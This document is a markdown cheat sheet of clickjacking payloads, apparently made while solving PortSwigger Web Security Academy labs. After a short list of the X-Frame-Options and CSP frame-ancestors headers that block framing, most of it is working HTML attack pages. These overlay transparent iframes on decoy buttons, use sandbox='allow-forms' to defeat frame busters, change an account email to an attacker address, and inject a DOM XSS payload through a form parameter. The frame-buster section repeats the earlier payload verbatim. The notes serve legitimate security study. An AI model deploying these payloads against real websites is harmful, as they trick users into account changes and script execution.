# Clickjacking

## Will not work if can se these **headers**:

### X-Frame-Options:

		DENY: Prevents the site from being embedded in any iframe.
		SAMEORIGIN: Allows embedding only if the parent page is from the same origin.
		ALLOW-FROM <URL>: (Less common, partially deprecated) Allows embedding only from a specific origin.

### Content-Security-Policy (CSP):

		frame-ancestors 'none': Completely blocks framing of the page.
		frame-ancestors 'self': Only allows embedding from the same origin.
		frame-ancestors <URL>: Allows embedding only from specified sources.
  
### Example:

```
X-Frame-Options: DENY

Content-Security-Policy: frame-ancestors 'none';
```

## Basic:
```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

## Basic clickjacking with CSRF token protection

```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

## Clickjacking with a frame buster script

```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

**Frame Busters** are JavaScript that can block clickjacking. 
An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. 
Use the **allow-forms** or **allow-scripts** values and the **allow-top-navigation**:
`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`

## Exploiting clickjacking vulnerability to trigger DOM-based XSS

This lab contains an XSS vulnerability that is triggered by a click.

```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.5;
		z-index: 2;
	}
	div {
		position:absolute;
		top:610px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Multistep clickjacking

```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.5;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:330px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:330px;
		left:50px;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
